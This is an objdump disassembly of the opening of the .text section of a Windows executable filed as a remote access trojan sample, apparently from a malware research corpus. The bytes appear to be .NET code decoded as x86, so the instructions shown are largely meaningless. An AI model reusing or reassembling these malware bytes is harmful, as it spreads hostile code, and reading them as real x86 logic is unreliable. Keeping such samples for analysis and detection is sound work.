
malware_samples/rat/c50bb7b421d88aebc578a5f2c9004771ccfeae6424403fb0e1a582a39d74e71e.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	c0 cf 00             	ror    $0x0,%bh
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 88 6d 00       	add    $0x6d8800,%eax
  402013:	00 04 62             	add    %al,(%edx,%eiz,2)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	02 00                	add    (%eax),%al
  40201c:	5e                   	pop    %esi
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	6d                   	insl   (%dx),%es:(%edi)
  402051:	6f                   	outsl  %ds:(%esi),(%dx)
  402052:	6f                   	outsl  %ds:(%esi),(%dx)
  402053:	6d                   	insl   (%dx),%es:(%edi)
  402054:	38 32                	cmp    %dh,(%edx)
  402056:	35 00 03 ac 67       	xor    $0x67ac0300,%eax
  40205b:	42                   	inc    %edx
  40205c:	16                   	push   %ss
  40205d:	f3 e1 5c             	repz loope 0x4020bc
  402060:	76 1e                	jbe    0x402080
  402062:	e1 a5                	loope  0x402009
  402064:	e2 55                	loop   0x4020bb
  402066:	f0 67 95             	lock addr16 xchg %eax,%ebp
  402069:	36 23 c8             	ss and %eax,%ecx
  40206c:	b3 88                	mov    $0x88,%bl
  40206e:	b4 45                	mov    $0x45,%ah
  402070:	9e                   	sahf
  402071:	13 f9                	adc    %ecx,%edi
  402073:	78 d7                	js     0x40204c
  402075:	c8 46 f4 1e          	enter  $0xf446,$0x1e
  402079:	02 28                	add    (%eax),%ch
  40207b:	16                   	push   %ss
  40207c:	00 00                	add    %al,(%eax)
  40207e:	0a 2a                	or     (%edx),%ch
  402080:	ce                   	into
  402081:	02 73 17             	add    0x17(%ebx),%dh
  402084:	00 00                	add    %al,(%eax)
  402086:	0a 7d 03             	or     0x3(%ebp),%bh
  402089:	00 00                	add    %al,(%eax)
  40208b:	04 02                	add    $0x2,%al
  40208d:	72 01                	jb     0x402090
  40208f:	00 00                	add    %al,(%eax)
  402091:	70 7d                	jo     0x402110
  402093:	04 00                	add    $0x0,%al
  402095:	00 04 02             	add    %al,(%edx,%eax,1)
  402098:	28 16                	sub    %dl,(%esi)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	0a 28                	or     (%eax),%ch
  40209e:	18 00                	sbb    %al,(%eax)
  4020a0:	00 0a                	add    %cl,(%edx)
  4020a2:	14 fe                	adc    $0xfe,%al
  4020a4:	06                   	push   %es
  4020a5:	0b 00                	or     (%eax),%eax
  4020a7:	00 06                	add    %al,(%esi)
  4020a9:	73 19                	jae    0x4020c4
  4020ab:	00 00                	add    %al,(%eax)
  4020ad:	0a 6f 1a             	or     0x1a(%edi),%ch
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	0a 2a                	or     (%edx),%ch
  4020b4:	92                   	xchg   %eax,%edx
  4020b5:	03 6f 1e             	add    0x1e(%edi),%ebp
  4020b8:	00 00                	add    %al,(%eax)
  4020ba:	0a 73 1f             	or     0x1f(%ebx),%dh
  4020bd:	00 00                	add    %al,(%eax)
  4020bf:	0a 28                	or     (%eax),%ch
  4020c1:	20 00                	and    %al,(%eax)
  4020c3:	00 0a                	add    %cl,(%edx)
  4020c5:	72 19                	jb     0x4020e0
  4020c7:	00 00                	add    %al,(%eax)
  4020c9:	70 28                	jo     0x4020f3
  4020cb:	21 00                	and    %eax,(%eax)
  4020cd:	00 0a                	add    %cl,(%edx)
  4020cf:	2c 06                	sub    $0x6,%al
  4020d1:	28 22                	sub    %ah,(%edx)
  4020d3:	00 00                	add    %al,(%eax)
  4020d5:	0a 2a                	or     (%edx),%ch
  4020d7:	14 2a                	adc    $0x2a,%al
  4020d9:	36 02 7c 06 00       	add    %ss:0x0(%esi,%eax,1),%bh
  4020de:	00 04 03             	add    %al,(%ebx,%eax,1)
  4020e1:	28 3f                	sub    %bh,(%edi)
  4020e3:	00 00                	add    %al,(%eax)
  4020e5:	0a 2a                	or     (%edx),%ch
  4020e7:	56                   	push   %esi
  4020e8:	02 28                	add    (%eax),%ch
  4020ea:	16                   	push   %ss
  4020eb:	00 00                	add    %al,(%eax)
  4020ed:	0a 02                	or     (%edx),%al
  4020ef:	04 7d                	add    $0x7d,%al
  4020f1:	14 00                	adc    $0x0,%al
  4020f3:	00 04 02             	add    %al,(%edx,%eax,1)
  4020f6:	03 7d 13             	add    0x13(%ebp),%edi
  4020f9:	00 00                	add    %al,(%eax)
  4020fb:	04 2a                	add    $0x2a,%al
  4020fd:	06                   	push   %es
  4020fe:	2a 36                	sub    (%esi),%dh
  402100:	02 7c 16 00          	add    0x0(%esi,%edx,1),%bh
  402104:	00 04 03             	add    %al,(%ebx,%eax,1)
  402107:	28 3f                	sub    %bh,(%edi)
  402109:	00 00                	add    %al,(%eax)
  40210b:	0a 2a                	or     (%edx),%ch
  40210d:	36 02 7c 1c 00       	add    %ss:0x0(%esp,%ebx,1),%bh
  402112:	00 04 03             	add    %al,(%ebx,%eax,1)
  402115:	28 3f                	sub    %bh,(%edi)
  402117:	00 00                	add    %al,(%eax)
  402119:	0a 2a                	or     (%edx),%ch
  40211b:	36 02 7c 22 00       	add    %ss:0x0(%edx,%eiz,1),%bh
  402120:	00 04 03             	add    %al,(%ebx,%eax,1)
  402123:	28 3f                	sub    %bh,(%edi)
  402125:	00 00                	add    %al,(%eax)
  402127:	0a 2a                	or     (%edx),%ch
  402129:	36 02 7c 26 00       	add    %ss:0x0(%esi,%eiz,1),%bh
  40212e:	00 04 03             	add    %al,(%ebx,%eax,1)
  402131:	28 3f                	sub    %bh,(%edi)
  402133:	00 00                	add    %al,(%eax)
  402135:	0a 2a                	or     (%edx),%ch
  402137:	36 02 7c 2d 00       	add    %ss:0x0(%ebp,%ebp,1),%bh
  40213c:	00 04 03             	add    %al,(%ebx,%eax,1)
  40213f:	28 3f                	sub    %bh,(%edi)
  402141:	00 00                	add    %al,(%eax)
  402143:	0a 2a                	or     (%edx),%ch
  402145:	36 02 7c 32 00       	add    %ss:0x0(%edx,%esi,1),%bh
  40214a:	00 04 03             	add    %al,(%ebx,%eax,1)
  40214d:	28 3f                	sub    %bh,(%edi)
  40214f:	00 00                	add    %al,(%eax)
  402151:	0a 2a                	or     (%edx),%ch
  402153:	36 02 7c 3b 00       	add    %ss:0x0(%ebx,%edi,1),%bh
  402158:	00 04 03             	add    %al,(%ebx,%eax,1)
  40215b:	28 3f                	sub    %bh,(%edi)
  40215d:	00 00                	add    %al,(%eax)
  40215f:	0a 2a                	or     (%edx),%ch
  402161:	36 02 7c 41 00       	add    %ss:0x0(%ecx,%eax,2),%bh
  402166:	00 04 03             	add    %al,(%ebx,%eax,1)
  402169:	28 3f                	sub    %bh,(%edi)
  40216b:	00 00                	add    %al,(%eax)
  40216d:	0a 2a                	or     (%edx),%ch
  40216f:	d6                   	salc
  402170:	02 73 6c             	add    0x6c(%ebx),%dh
  402173:	00 00                	add    %al,(%eax)
  402175:	0a 7d 46             	or     0x46(%ebp),%bh
  402178:	00 00                	add    %al,(%eax)
  40217a:	04 02                	add    $0x2,%al
  40217c:	15 7d 49 00 00       	adc    $0x497d,%eax
  402181:	04 02                	add    $0x2,%al
  402183:	15 7d 4a 00 00       	adc    $0x4a7d,%eax
  402188:	04 02                	add    $0x2,%al
  40218a:	15 7d 4b 00 00       	adc    $0x4b7d,%eax
  40218f:	04 02                	add    $0x2,%al
  402191:	28 16                	sub    %dl,(%esi)
  402193:	00 00                	add    %al,(%eax)
  402195:	0a 02                	or     (%edx),%al
  402197:	03 7d 47             	add    0x47(%ebp),%edi
  40219a:	00 00                	add    %al,(%eax)
  40219c:	04 02                	add    $0x2,%al
  40219e:	04 7d                	add    $0x7d,%al
  4021a0:	45                   	inc    %ebp
  4021a1:	00 00                	add    %al,(%eax)
  4021a3:	04 2a                	add    $0x2a,%al
  4021a5:	36 02 7b 46          	add    %ss:0x46(%ebx),%bh
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 03                	add    $0x3,%al
  4021ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ae:	6d                   	insl   (%dx),%es:(%edi)
  4021af:	00 00                	add    %al,(%eax)
  4021b1:	0a 2a                	or     (%edx),%ch
  4021b3:	66 03 8e 69 04 8e 69 	add    0x698e0469(%esi),%cx
  4021ba:	33 0f                	xor    (%edi),%ecx
  4021bc:	03 04 03             	add    (%ebx,%eax,1),%eax
  4021bf:	8e 69 6a             	mov    0x6a(%ecx),%gs
  4021c2:	28 2b                	sub    %ch,(%ebx)
  4021c4:	00 00                	add    %al,(%eax)
  4021c6:	06                   	push   %es
  4021c7:	16                   	push   %ss
  4021c8:	fe 01                	incb   (%ecx)
  4021ca:	2a 16                	sub    (%esi),%dl
  4021cc:	2a 36                	sub    (%esi),%dh
  4021ce:	02 7b 47             	add    0x47(%ebx),%bh
  4021d1:	00 00                	add    %al,(%eax)
  4021d3:	04 03                	add    $0x3,%al
  4021d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4021d6:	4c                   	dec    %esp
  4021d7:	00 00                	add    %al,(%eax)
  4021d9:	06                   	push   %es
  4021da:	2a 32                	sub    (%edx),%dh
  4021dc:	02 7b 47             	add    0x47(%ebx),%bh
  4021df:	00 00                	add    %al,(%eax)
  4021e1:	04 6f                	add    $0x6f,%al
  4021e3:	4d                   	dec    %ebp
  4021e4:	00 00                	add    %al,(%eax)
  4021e6:	06                   	push   %es
  4021e7:	2a 36                	sub    (%esi),%dh
  4021e9:	02 7c 4d 00          	add    0x0(%ebp,%ecx,2),%bh
  4021ed:	00 04 03             	add    %al,(%ebx,%eax,1)
  4021f0:	28 7e 00             	sub    %bh,0x0(%esi)
  4021f3:	00 0a                	add    %cl,(%edx)
  4021f5:	2a 36                	sub    (%esi),%dh
  4021f7:	02 7c 55 00          	add    0x0(%ebp,%edx,2),%bh
  4021fb:	00 04 03             	add    %al,(%ebx,%eax,1)
  4021fe:	28 85 00 00 0a 2a    	sub    %al,0x2a0a0000(%ebp)
  402204:	36 02 7c 60 00       	add    %ss:0x0(%eax,%eiz,2),%bh
  402209:	00 04 03             	add    %al,(%ebx,%eax,1)
  40220c:	28 97 00 00 0a 2a    	sub    %dl,0x2a0a0000(%edi)
  402212:	36 02 7c 64 00       	add    %ss:0x0(%esp,%eiz,2),%bh
  402217:	00 04 03             	add    %al,(%ebx,%eax,1)
  40221a:	28 9b 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ebx)
  402220:	36 02 7c 68 00       	add    %ss:0x0(%eax,%ebp,2),%bh
  402225:	00 04 03             	add    %al,(%ebx,%eax,1)
  402228:	28 7e 00             	sub    %bh,0x0(%esi)
  40222b:	00 0a                	add    %cl,(%edx)
  40222d:	2a 3a                	sub    (%edx),%bh
  40222f:	02 17                	add    (%edi),%dl
  402231:	7d 6e                	jge    0x4022a1
  402233:	00 00                	add    %al,(%eax)
  402235:	04 02                	add    $0x2,%al
  402237:	28 16                	sub    %dl,(%esi)
  402239:	00 00                	add    %al,(%eax)
  40223b:	0a 2a                	or     (%edx),%ch
  40223d:	86 02                	xchg   %al,(%edx)
  40223f:	28 16                	sub    %dl,(%esi)
  402241:	00 00                	add    %al,(%eax)
  402243:	0a 02                	or     (%edx),%al
  402245:	03 7d 6f             	add    0x6f(%ebp),%edi
  402248:	00 00                	add    %al,(%eax)
  40224a:	04 02                	add    $0x2,%al
  40224c:	7b 6f                	jnp    0x4022bd
  40224e:	00 00                	add    %al,(%eax)
  402250:	04 17                	add    $0x17,%al
  402252:	6f                   	outsl  %ds:(%esi),(%dx)
  402253:	9c                   	pushf
  402254:	00 00                	add    %al,(%eax)
  402256:	0a 02                	or     (%edx),%al
  402258:	04 7d                	add    $0x7d,%al
  40225a:	70 00                	jo     0x40225c
  40225c:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40225f:	52                   	push   %edx
  402260:	02 03                	add    (%ebx),%al
  402262:	7d 71                	jge    0x4022d5
  402264:	00 00                	add    %al,(%eax)
  402266:	04 02                	add    $0x2,%al
  402268:	7b 6f                	jnp    0x4022d9
  40226a:	00 00                	add    %al,(%eax)
  40226c:	04 03                	add    $0x3,%al
  40226e:	6f                   	outsl  %ds:(%esi),(%dx)
  40226f:	a3 00 00 0a 2a       	mov    %eax,0x2a0a0000
  402274:	52                   	push   %edx
  402275:	02 16                	add    (%esi),%dl
  402277:	7d 71                	jge    0x4022ea
  402279:	00 00                	add    %al,(%eax)
  40227b:	04 02                	add    $0x2,%al
  40227d:	7b 6f                	jnp    0x4022ee
  40227f:	00 00                	add    %al,(%eax)
  402281:	04 16                	add    $0x16,%al
  402283:	6f                   	outsl  %ds:(%esi),(%dx)
  402284:	a3 00 00 0a 2a       	mov    %eax,0x2a0a0000
  402289:	2e 73 4f             	jae,pn 0x4022db
  40228c:	00 00                	add    %al,(%eax)
  40228e:	06                   	push   %es
  40228f:	80 72 00 00          	xorb   $0x0,0x0(%edx)
  402293:	04 2a                	add    $0x2a,%al
  402295:	0a 03                	or     (%ebx),%al
  402297:	2a 36                	sub    (%esi),%dh
  402299:	02 7c 75 00          	add    0x0(%ebp,%esi,2),%bh
  40229d:	00 04 03             	add    %al,(%ebx,%eax,1)
  4022a0:	28 9b 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ebx)
  4022a6:	36 02 7c 79 00       	add    %ss:0x0(%ecx,%edi,2),%bh
  4022ab:	00 04 03             	add    %al,(%ebx,%eax,1)
  4022ae:	28 9b 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ebx)
  4022b4:	36 02 7c 84 00       	add    %ss:0x0(%esp,%eax,4),%bh
  4022b9:	00 04 03             	add    %al,(%ebx,%eax,1)
  4022bc:	28 9b 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ebx)
  4022c2:	36 02 7c 8c 00       	add    %ss:0x0(%esp,%ecx,4),%bh
  4022c7:	00 04 03             	add    %al,(%ebx,%eax,1)
  4022ca:	28 7e 00             	sub    %bh,0x0(%esi)
  4022cd:	00 0a                	add    %cl,(%edx)
  4022cf:	2a 32                	sub    (%edx),%dh
  4022d1:	02 6f 30             	add    0x30(%edi),%ch
  4022d4:	00 00                	add    %al,(%eax)
  4022d6:	06                   	push   %es
  4022d7:	28 b3 00 00 0a 2a    	sub    %dh,0x2a0a0000(%ebx)
  4022dd:	36 02 7c 9c 00       	add    %ss:0x0(%esp,%ebx,4),%bh
  4022e2:	00 04 03             	add    %al,(%ebx,%eax,1)
  4022e5:	28 3f                	sub    %bh,(%edi)
  4022e7:	00 00                	add    %al,(%eax)
  4022e9:	0a 2a                	or     (%edx),%ch
  4022eb:	3a 02                	cmp    (%edx),%al
  4022ed:	28 c6                	sub    %al,%dh
  4022ef:	00 00                	add    %al,(%eax)
  4022f1:	0a 02                	or     (%edx),%al
  4022f3:	03 7d a4             	add    -0x5c(%ebp),%edi
  4022f6:	00 00                	add    %al,(%eax)
  4022f8:	04 2a                	add    $0x2a,%al
  4022fa:	32 02                	xor    (%edx),%al
  4022fc:	7b a4                	jnp    0x4022a2
  4022fe:	00 00                	add    %al,(%eax)
  402300:	04 6f                	add    $0x6f,%al
  402302:	c7 00 00 0a 2a 66    	movl   $0x662a0a00,(%eax)
  402308:	7e 9a                	jle    0x4022a4
  40230a:	00 00                	add    %al,(%eax)
  40230c:	04 03                	add    $0x3,%al
  40230e:	6f                   	outsl  %ds:(%esi),(%dx)
  40230f:	c8 00 00 0a          	enter  $0x0,$0xa
  402313:	26 02 7b a4          	add    %es:-0x5c(%ebx),%bh
  402317:	00 00                	add    %al,(%eax)
  402319:	04 03                	add    $0x3,%al
  40231b:	6f                   	outsl  %ds:(%esi),(%dx)
  40231c:	c9                   	leave
  40231d:	00 00                	add    %al,(%eax)
  40231f:	0a 2a                	or     (%edx),%ch
  402321:	66 7e 9a             	data16 jle 0x4022be
  402324:	00 00                	add    %al,(%eax)
  402326:	04 03                	add    $0x3,%al
  402328:	6f                   	outsl  %ds:(%esi),(%dx)
  402329:	ca 00 00             	lret   $0x0
  40232c:	0a 26                	or     (%esi),%ah
  40232e:	02 7b a4             	add    -0x5c(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 03                	add    $0x3,%al
  402335:	6f                   	outsl  %ds:(%esi),(%dx)
  402336:	cb                   	lret
  402337:	00 00                	add    %al,(%eax)
  402339:	0a 2a                	or     (%edx),%ch
  40233b:	2e 7e 9a             	jle,pn 0x4022d8
  40233e:	00 00                	add    %al,(%eax)
  402340:	04 6f                	add    $0x6f,%al
  402342:	59                   	pop    %ecx
  402343:	00 00                	add    %al,(%eax)
  402345:	0a 2a                	or     (%edx),%ch
  402347:	32 7e 9a             	xor    -0x66(%esi),%bh
  40234a:	00 00                	add    %al,(%eax)
  40234c:	04 6f                	add    $0x6f,%al
  40234e:	cc                   	int3
  40234f:	00 00                	add    %al,(%eax)
  402351:	0a 26                	or     (%esi),%ah
  402353:	2a 2e                	sub    (%esi),%ch
  402355:	73 7e                	jae    0x4023d5
  402357:	00 00                	add    %al,(%eax)
  402359:	06                   	push   %es
  40235a:	80 a7 00 00 04 2a 1a 	andb   $0x1a,0x2a040000(%edi)
  402361:	28 6f 00             	sub    %ch,0x0(%edi)
  402364:	00 06                	add    %al,(%esi)
  402366:	2a 1a                	sub    (%edx),%bl
  402368:	28 7b 00             	sub    %bh,0x0(%ebx)
  40236b:	00 06                	add    %al,(%esi)
  40236d:	2a 36                	sub    (%esi),%dh
  40236f:	02 7c ae 00          	add    0x0(%esi,%ebp,4),%bh
  402373:	00 04 03             	add    %al,(%ebx,%eax,1)
  402376:	28 7e 00             	sub    %bh,0x0(%esi)
  402379:	00 0a                	add    %cl,(%edx)
  40237b:	2a 36                	sub    (%esi),%dh
  40237d:	02 7c b5 00          	add    0x0(%ebp,%esi,4),%bh
  402381:	00 04 03             	add    %al,(%ebx,%eax,1)
  402384:	28 7e 00             	sub    %bh,0x0(%esi)
  402387:	00 0a                	add    %cl,(%edx)
  402389:	2a 36                	sub    (%esi),%dh
  40238b:	02 7c ba 00          	add    0x0(%edx,%edi,4),%bh
  40238f:	00 04 03             	add    %al,(%ebx,%eax,1)
  402392:	28 85 00 00 0a 2a    	sub    %al,0x2a0a0000(%ebp)
  402398:	36 02 7c c3 00       	add    %ss:0x0(%ebx,%eax,8),%bh
  40239d:	00 04 03             	add    %al,(%ebx,%eax,1)
  4023a0:	28 18                	sub    %bl,(%eax)
  4023a2:	01 00                	add    %eax,(%eax)
  4023a4:	0a 2a                	or     (%edx),%ch
  4023a6:	36 02 7c c6 00       	add    %ss:0x0(%esi,%eax,8),%bh
  4023ab:	00 04 03             	add    %al,(%ebx,%eax,1)
  4023ae:	28 1d 01 00 0a 2a    	sub    %bl,0x2a0a0001
  4023b4:	36 02 7c c9 00       	add    %ss:0x0(%ecx,%ecx,8),%bh
  4023b9:	00 04 03             	add    %al,(%ebx,%eax,1)
  4023bc:	28 3f                	sub    %bh,(%edi)
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	0a 2a                	or     (%edx),%ch
  4023c2:	36 02 7c cd 00       	add    %ss:0x0(%ebp,%ecx,8),%bh
  4023c7:	00 04 03             	add    %al,(%ebx,%eax,1)
  4023ca:	28 3f                	sub    %bh,(%edi)
  4023cc:	00 00                	add    %al,(%eax)
  4023ce:	0a 2a                	or     (%edx),%ch
  4023d0:	13 30                	adc    (%eax),%esi
  4023d2:	08 00                	or     %al,(%eax)
  4023d4:	67 00 00             	add    %al,(%bx,%si)
  4023d7:	00 01                	add    %al,(%ecx)
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	11 02                	adc    %eax,(%edx)
  4023dd:	8e 69 1c             	mov    0x1c(%ecx),%gs
  4023e0:	5a                   	pop    %edx
  4023e1:	8d 2e                	lea    (%esi),%ebp
  4023e3:	00 00                	add    %al,(%eax)
  4023e5:	01 0a                	add    %ecx,(%edx)
  4023e7:	16                   	push   %ss
  4023e8:	0b 16                	or     (%esi),%edx
  4023ea:	0c 20                	or     $0x20,%al
  4023ec:	02 01                	add    (%ecx),%al
  4023ee:	00 00                	add    %al,(%eax)
  4023f0:	12 01                	adc    (%ecx),%al
  4023f2:	12 02                	adc    (%edx),%al
  4023f4:	28 01                	sub    %al,(%ecx)
  4023f6:	00 00                	add    %al,(%eax)
  4023f8:	06                   	push   %es
  4023f9:	2c 02                	sub    $0x2,%al
  4023fb:	14 2a                	adc    $0x2a,%al
  4023fd:	16                   	push   %ss
  4023fe:	0d 16 07 6e 73       	or     $0x736e0716,%eax
  402403:	14 00                	adc    $0x0,%al
  402405:	00 0a                	add    %cl,(%edx)
  402407:	28 04 00             	sub    %al,(%eax,%eax,1)
  40240a:	00 06                	add    %al,(%esi)
  40240c:	13 04 20             	adc    (%eax,%eiz,1),%eax
  40240f:	02 01                	add    (%ecx),%al
  402411:	00 00                	add    %al,(%eax)
  402413:	02 02                	add    (%edx),%al
  402415:	8e 69 06             	mov    0x6(%ecx),%gs
  402418:	06                   	push   %es
  402419:	8e 69 16             	mov    0x16(%ecx),%gs
  40241c:	12 03                	adc    (%ebx),%al
  40241e:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402421:	03 00                	add    (%eax),%eax
  402423:	00 06                	add    %al,(%esi)
  402425:	2c 0a                	sub    $0xa,%al
  402427:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  40242a:	05 00 00 06 26       	add    $0x26060000,%eax
  40242f:	14 2a                	adc    $0x2a,%al
  402431:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402434:	05 00 00 06 26       	add    $0x26060000,%eax
  402439:	12 00                	adc    (%eax),%al
  40243b:	09 28                	or     %ebp,(%eax)
  40243d:	01 00                	add    %eax,(%eax)
  40243f:	00 2b                	add    %ch,(%ebx)
  402441:	06                   	push   %es
  402442:	2a 00                	sub    (%eax),%al
  402444:	13 30                	adc    (%eax),%esi
  402446:	06                   	push   %es
  402447:	00 1a                	add    %bl,(%edx)
  402449:	00 00                	add    %al,(%eax)
  40244b:	00 02                	add    %al,(%edx)
  40244d:	00 00                	add    %al,(%eax)
  40244f:	11 16                	adc    %edx,(%esi)
  402451:	0a 03                	or     (%ebx),%al
  402453:	8d 2e                	lea    (%esi),%ebp
  402455:	00 00                	add    %al,(%eax)
  402457:	01 0b                	add    %ecx,(%ebx)
  402459:	18 07                	sbb    %al,(%edi)
  40245b:	03 02                	add    (%edx),%eax
  40245d:	02 8e 69 12 00 28    	add    0x28001269(%esi),%cl
  402463:	02 00                	add    (%eax),%al
  402465:	00 06                	add    %al,(%esi)
  402467:	26 07                	es pop %es
  402469:	2a 00                	sub    (%eax),%al
  40246b:	00 13                	add    %dl,(%ebx)
  40246d:	30 02                	xor    %al,(%edx)
  40246f:	00 3f                	add    %bh,(%edi)
  402471:	00 00                	add    %al,(%eax)
  402473:	00 03                	add    %al,(%ebx)
  402475:	00 00                	add    %al,(%eax)
  402477:	11 12                	adc    %edx,(%edx)
  402479:	00 28                	add    %ch,(%eax)
  40247b:	1b 00                	sbb    (%eax),%eax
  40247d:	00 0a                	add    %cl,(%edx)
  40247f:	7d 06                	jge    0x402487
  402481:	00 00                	add    %al,(%eax)
  402483:	04 12                	add    $0x12,%al
  402485:	00 02                	add    %al,(%edx)
  402487:	7d 08                	jge    0x402491
  402489:	00 00                	add    %al,(%eax)
  40248b:	04 12                	add    $0x12,%al
  40248d:	00 03                	add    %al,(%ebx)
  40248f:	7d 07                	jge    0x402498
  402491:	00 00                	add    %al,(%eax)
  402493:	04 12                	add    $0x12,%al
  402495:	00 15 7d 05 00 00    	add    %dl,0x57d
  40249b:	04 12                	add    $0x12,%al
  40249d:	00 7c 06 00          	add    %bh,0x0(%esi,%eax,1)
  4024a1:	00 04 12             	add    %al,(%edx,%edx,1)
  4024a4:	00 28                	add    %ch,(%eax)
  4024a6:	02 00                	add    (%eax),%al
  4024a8:	00 2b                	add    %ch,(%ebx)
  4024aa:	12 00                	adc    (%eax),%al
  4024ac:	7c 06                	jl     0x4024b4
  4024ae:	00 00                	add    %al,(%eax)
  4024b0:	04 28                	add    $0x28,%al
  4024b2:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  4024b7:	00 1b                	add    %bl,(%ebx)
  4024b9:	30 06                	xor    %al,(%esi)
  4024bb:	00 8b 04 00 00 04    	add    %cl,0x4000004(%ebx)
  4024c1:	00 00                	add    %al,(%eax)
  4024c3:	11 02                	adc    %eax,(%edx)
  4024c5:	7b 05                	jnp    0x4024cc
  4024c7:	00 00                	add    %al,(%eax)
  4024c9:	04 0a                	add    $0xa,%al
  4024cb:	02 7b 08             	add    0x8(%ebx),%bh
  4024ce:	00 00                	add    %al,(%eax)
  4024d0:	04 0b                	add    $0xb,%al
  4024d2:	06                   	push   %es
  4024d3:	45                   	inc    %ebp
  4024d4:	07                   	pop    %es
  4024d5:	00 00                	add    %al,(%eax)
  4024d7:	00 3e                	add    %bh,(%esi)
  4024d9:	00 00                	add    %al,(%eax)
  4024db:	00 3e                	add    %bh,(%esi)
  4024dd:	00 00                	add    %al,(%eax)
  4024df:	00 3e                	add    %bh,(%esi)
  4024e1:	00 00                	add    %al,(%eax)
  4024e3:	00 3e                	add    %bh,(%esi)
  4024e5:	00 00                	add    %al,(%eax)
  4024e7:	00 3e                	add    %bh,(%esi)
  4024e9:	00 00                	add    %al,(%eax)
  4024eb:	00 73 03             	add    %dh,0x3(%ebx)
  4024ee:	00 00                	add    %al,(%eax)
  4024f0:	e9 03 00 00 02       	jmp    0x24024f8
  4024f5:	17                   	pop    %ss
  4024f6:	8d 2e                	lea    (%esi),%ebp
  4024f8:	00 00                	add    %al,(%eax)
  4024fa:	01 25 16 17 9c 7d    	add    %esp,0x7d9c1716
  402500:	09 00                	or     %eax,(%eax)
  402502:	00 04 02             	add    %al,(%edx,%eax,1)
  402505:	17                   	pop    %ss
  402506:	8d 2e                	lea    (%esi),%ebp
  402508:	00 00                	add    %al,(%eax)
  40250a:	01 7d 0a             	add    %edi,0xa(%ebp)
  40250d:	00 00                	add    %al,(%eax)
  40250f:	04 02                	add    $0x2,%al
  402511:	17                   	pop    %ss
  402512:	8d 2e                	lea    (%esi),%ebp
  402514:	00 00                	add    %al,(%eax)
  402516:	01 25 16 18 9c 7d    	add    %esp,0x7d9c1816
  40251c:	0b 00                	or     (%eax),%eax
  40251e:	00 04 17             	add    %al,(%edi,%edx,1)
  402521:	8d 2e                	lea    (%esi),%ebp
  402523:	00 00                	add    %al,(%eax)
  402525:	01 25 16 19 9c 26    	add    %esp,0x269c1916
  40252b:	02 16                	add    (%esi),%dl
  40252d:	7d 0d                	jge    0x40253c
  40252f:	00 00                	add    %al,(%eax)
  402531:	04 00                	add    $0x0,%al
  402533:	06                   	push   %es
  402534:	45                   	inc    %ebp
  402535:	05 00 00 00 3f       	add    $0x3f000000,%eax
  40253a:	00 00                	add    %al,(%eax)
  40253c:	00 db                	add    %bl,%bl
  40253e:	00 00                	add    %al,(%eax)
  402540:	00 3f                	add    %bh,(%edi)
  402542:	01 00                	add    %eax,(%eax)
  402544:	00 cd                	add    %cl,%ch
  402546:	01 00                	add    %eax,(%eax)
  402548:	00 74 02 00          	add    %dh,0x0(%edx,%eax,1)
  40254c:	00 02                	add    %al,(%edx)
  40254e:	7b 07                	jnp    0x402557
  402550:	00 00                	add    %al,(%eax)
  402552:	04 6f                	add    $0x6f,%al
  402554:	31 00                	xor    %eax,(%eax)
  402556:	00 06                	add    %al,(%esi)
  402558:	6f                   	outsl  %ds:(%esi),(%dx)
  402559:	23 00                	and    (%eax),%eax
  40255b:	00 0a                	add    %cl,(%edx)
  40255d:	13 04 12             	adc    (%edx,%edx,1),%eax
  402560:	04 28                	add    $0x28,%al
  402562:	24 00                	and    $0x0,%al
  402564:	00 0a                	add    %cl,(%edx)
  402566:	2d 41 02 16 25       	sub    $0x25160241,%eax
  40256b:	0a 7d 05             	or     0x5(%ebp),%bh
  40256e:	00 00                	add    %al,(%eax)
  402570:	04 02                	add    $0x2,%al
  402572:	11 04 7d 0f 00 00 04 	adc    %eax,0x400000f(,%edi,2)
  402579:	02 7c 06 00          	add    0x0(%esi,%eax,1),%bh
  40257d:	00 04 12             	add    %al,(%edx,%edx,1)
  402580:	04 02                	add    $0x2,%al
  402582:	28 03                	sub    %al,(%ebx)
  402584:	00 00                	add    %al,(%eax)
  402586:	2b dd                	sub    %ebp,%ebx
  402588:	c2 03 00             	ret    $0x3
  40258b:	00 02                	add    %al,(%edx)
  40258d:	7b 0f                	jnp    0x40259e
  40258f:	00 00                	add    %al,(%eax)
  402591:	04 13                	add    $0x13,%al
  402593:	04 02                	add    $0x2,%al
  402595:	7c 0f                	jl     0x4025a6
  402597:	00 00                	add    %al,(%eax)
  402599:	04 fe                	add    $0xfe,%al
  40259b:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4025a0:	02 15 25 0a 7d 05    	add    0x57d0a25,%dl
  4025a6:	00 00                	add    %al,(%eax)
  4025a8:	04 12                	add    $0x12,%al
  4025aa:	04 28                	add    $0x28,%al
  4025ac:	26 00 00             	add    %al,%es:(%eax)
  4025af:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4025b2:	28 27                	sub    %ah,(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 08                	or     (%eax),%cl
  4025b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4025b9:	28 00                	sub    %al,(%eax)
  4025bb:	00 0a                	add    %cl,(%edx)
